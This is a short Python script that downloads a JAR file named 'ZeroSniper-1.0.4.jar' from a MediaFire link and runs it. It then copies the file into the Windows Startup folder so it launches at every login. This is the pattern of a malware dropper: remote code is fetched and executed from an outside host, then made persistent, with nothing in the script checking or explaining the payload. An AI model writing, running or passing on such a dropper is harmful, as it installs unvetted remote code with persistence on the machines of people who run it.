import os
import requests
import subprocess
import shutil

# URL of the file to download and execute
url = "https://www.mediafire.com/file/70ru29imuns46yh/ZeroSniper-1.0.4.jar/file"

# Download the file from the URL
response = requests.get(url)

# Save the file to disk
filename = "ZeroSniper-1.0.4.jar"
with open(filename, "wb") as file:
    file.write(response.content)

# Run the downloaded file
subprocess.call(filename, shell=True)

# Add the file to the Windows startup folder
startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
shutil.copy2(filename, startup_folder)
